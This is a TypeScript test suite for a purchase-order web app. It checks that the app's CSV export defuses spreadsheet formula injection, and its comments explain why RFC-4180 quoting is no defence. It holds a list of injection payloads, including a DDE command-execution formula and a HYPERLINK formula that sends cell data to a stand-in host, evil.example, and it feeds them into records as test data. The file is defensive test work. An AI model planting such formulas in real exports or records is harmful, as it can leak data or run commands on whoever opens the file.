import { beforeAll, describe, expect, it } from 'vitest';
import request from 'supertest';
import type { Express } from 'express';
import { createApp } from '../server/app.js';
import { openDb } from '../server/db.js';
import { seed } from '../server/seed.js';
import type { AuthConfig } from '../server/auth.js';
import { EXPORT_PROFILES } from '../server/export-profiles.js';

/**
 * Spreadsheet formula injection (CWE-1236) in the CSV export.
 *
 * RFC-4180 quoting is not a defence: the quotes are consumed by the CSV
 * parser, and the cell underneath is then interpreted by Excel, LibreOffice
 * Calc or Google Sheets. A cell starting with `=`, `+`, `-`, `@`, a tab or a
 * CR runs as a formula in all three — so for an export of records that users
 * typed in themselves, the operator who opens the file executes whatever the
 * last person to edit a record wanted them to.
 *
 * Every assertion below therefore works on the PARSED cells rather than on the
 * raw text: what matters is the value a spreadsheet ends up with, and quoting
 * alone would make a raw-substring check pass while the payload still runs.
 */

/** The families that actually execute, one per leading character. */
const PAYLOADS = [
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
  "=cmd|'/c calc'!A1",
  '\t=1+1',
];

/** Parse RFC-4180 CSV back into rows of cells — what a spreadsheet sees. */
function parseCsv(text: string, delimiter = ','): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch !== '"') cell += ch;
      else if (text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else quoted = false;
      continue;
    }
    if (ch === '"') quoted = true;
    else if (ch === delimiter) {
      row.push(cell);
      cell = '';
    } else if (ch === '\r' && text[i + 1] === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
      i += 1;
    } else cell += ch;
  }
  if (cell !== '' || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Every cell of the file, flattened. */
function cellsOf(csv: string, delimiter = ','): string[] {
  return parseCsv(csv, delimiter).flat();
}

/**
 * The payload survived as readable text, and no cell anywhere in the file
 * still begins with a character a spreadsheet would treat as a formula.
 */
function expectDefused(csv: string, payload: string, delimiter = ','): void {
  const cells = cellsOf(csv, delimiter);
  expect(cells).toContain(`'${payload}`);
  expect(cells).not.toContain(payload);
  for (const cell of cells) expect(cell).not.toMatch(/^[=+@\t\r]/);
}

/**
 * As `expectDefused`, but for a payload that reached the file THROUGH the API:
 * text fields are trimmed on the way in, so the stored — and exported — value
 * is the trimmed one. The invariant that matters is unchanged.
 */
function expectDefusedInput(csv: string, payload: string, delimiter = ','): void {
  expectDefused(csv, payload.trim(), delimiter);
}

const auth: AuthConfig = {
  username: 'admin',
  password: 'test-password',
  secret: 'test-secret',
  ttlHours: 1,
  secureCookie: false,
};

async function signIn(app: Express): Promise<string> {
  const res = await request(app).post('/api/login').send({ username: 'admin', password: 'test-password' });
  expect(res.status).toBe(200);
  return res.headers['set-cookie']![0]!.split(';')[0]!;
}

let app: Express;
let cookie: string;

/** A supplier named `name`, with one ordered PO whose line description is `text`. */
async function orderedPo(name: string, text: string): Promise<void> {
  const supplier = await request(app)
    .post('/api/suppliers')
    .set('Cookie', cookie)
    .send({ name, email: 'supplier@example.com', contact: name });
  expect(supplier.status).toBe(201);
  const po = await request(app)
    .post('/api/pos')
    .set('Cookie', cookie)
    .send({
      supplier_id: supplier.body.id,
      lines: [{ description: text, quantity: 1, unit: 'pc', unit_price_cents: 1_000 }],
    });
  expect(po.status).toBe(201);
  await request(app).post(`/api/pos/${po.body.id}/submit`).set('Cookie', cookie).send({});
  await request(app).post(`/api/pos/${po.body.id}/approvals`).set('Cookie', cookie).send({ tier: 1, approver: 'T. Ester' });
  await request(app).post(`/api/pos/${po.body.id}/mark-ordered`).set('Cookie', cookie).send({});
}

async function exportCsv(profile: string): Promise<string> {
  const res = await request(app).get(`/api/export/pos.csv?profile=${profile}`).set('Cookie', cookie);
  expect(res.status).toBe(200);
  return res.text;
}

beforeAll(async () => {
  const db = openDb(':memory:');
  seed(db);
  app = createApp({ db, auth });
  cookie = await signIn(app);
});

describe('PO CSV export neutralizes spreadsheet formulas', () => {
  it('defuses formulas in supplier names and line descriptions, in every profile', async () => {
    await orderedPo('=HYPERLINK("https://evil.example/?d="&A1,"Click me")', '@SUM(A1)');
    for (const profile of EXPORT_PROFILES) {
      const csv = await exportCsv(profile.name);
      expectDefusedInput(csv, '=HYPERLINK("https://evil.example/?d="&A1,"Click me")', profile.delimiter);
    }
    // Not every profile carries the description column, so assert it where it is.
    expectDefusedInput(await exportCsv('GENERIC'), '@SUM(A1)');
  });

  it.each(PAYLOADS)('defuses %o reaching the file through a supplier name', async (payload) => {
    await orderedPo(payload, 'Line item');
    expectDefusedInput(await exportCsv('GENERIC'), payload);
  });

  it('leaves money and dates as values a spreadsheet can compute on', async () => {
    // DATEV renders comma-decimal euros; those must not pick up an apostrophe.
    const cells = cellsOf(await exportCsv('DATEV-STYLE'), ';');
    expect(cells).toContain('10,00');
    expect(cells.some((c) => c.startsWith("'1"))).toBe(false);
  });
});
